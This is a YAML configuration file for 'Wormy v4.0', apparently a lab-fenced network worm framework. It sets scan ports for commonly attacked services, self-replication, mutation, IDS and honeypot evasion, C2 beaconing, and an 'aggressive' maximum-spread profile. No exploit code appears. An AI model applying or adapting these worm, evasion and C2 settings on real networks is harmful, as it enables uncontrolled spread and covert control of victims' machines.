# Wormy v4.0 — Consolidated Configuration
# Profile-specific overrides are merged on top of base defaults.
# Use: --profile <name> to activate a profile.

# ─── Base Configuration (applied to all profiles) ──────────────────

network:
  target_ranges:
    - "192.168.100.0/24"
  excluded_ips:
    - "192.168.100.1"
    - "192.168.100.254"
  scan_timeout: 5
  max_threads: 50
  ports_to_scan:
    - 21
    - 22
    - 23
    - 80
    - 135
    - 139
    - 161
    - 445
    - 6379
    - 3306
    - 5432
    - 27017
    - 1433
    - 5672
    - 5900
    - 8080
    - 9200
    - 2375
    - 3000
    - 15672
  self_replicate: false
  mutation_enabled: true

evasion:
  stealth_mode: false
  randomize_timing: false
  detect_honeypots: false
  detect_ids: false
  encrypt_traffic: true
  max_scan_rate: 500

c2:
  c2_server: "127.0.0.1"
  c2_port: 8443
  beacon_interval: 60
  use_encryption: true
  backup_c2_servers: []
  c2_protocol: "https"

safety:
  kill_switch_enabled: true
  kill_switch_code: "EMERGENCY_STOP_2024"
  auto_destruct_time: 0
  geofence_enabled: true
  allowed_networks:
    - "192.168.100.0/24"
  max_runtime_hours: 24
  enable_logging: true
  log_encryption: true

# ─── Profile Overrides ─────────────────────────────────────────────
# Each profile deep-merges on top of the base config.

profiles:

  default:
    description: "Normal operation with balanced stealth and speed"

  stealth:
    description: "Slow, careful, full evasion active"
    network:
      max_threads: 10
      scan_timeout: 10
      self_replicate: false
    evasion:
      stealth_mode: true
      randomize_timing: true
      detect_honeypots: true
      detect_ids: true
      max_scan_rate: 100
    c2:
      beacon_interval: 120
    safety:
      enable_logging: true

  aggressive:
    description: "Fast, maximum spread"
    network:
      max_threads: 200
      scan_timeout: 3
      self_replicate: true
    evasion:
      stealth_mode: false
      randomize_timing: false
      max_scan_rate: 1000
    c2:
      beacon_interval: 30

  audit:
    description: "Medium speed with detailed logging"
    network:
      max_threads: 30
      scan_timeout: 5
    evasion:
      stealth_mode: true
    safety:
      enable_logging: true
      log_encryption: false

  test:
    description: "Safe test mode (no real exploits)"
    network:
      target_ranges:
        - "192.168.100.0/24"
      scan_timeout: 10
      max_threads: 20
    safety:
      kill_switch_enabled: true
      max_runtime_hours: 2
    c2:
      beacon_interval: 5

  simulation:
    description: "Full simulation mode"
    network:
      target_ranges:
        - "192.168.100.0/24"
      scan_timeout: 10
      max_threads: 100
    evasion:
      stealth_mode: false
    c2:
      beacon_interval: 5
    safety:
      max_runtime_hours: 4

  lab_docker:
    description: "Docker lab environment"
    network:
      target_ranges:
        - "192.168.100.0/24"
      scan_timeout: 2
      max_threads: 100
    exploit:
      exploit_timeout: 5
    evasion:
      stealth_mode: false
    c2:
      c2_server: "127.0.0.1"
      beacon_interval: 5
    propagation:
      propagation_delay: 1
    safety:
      max_runtime_hours: 4
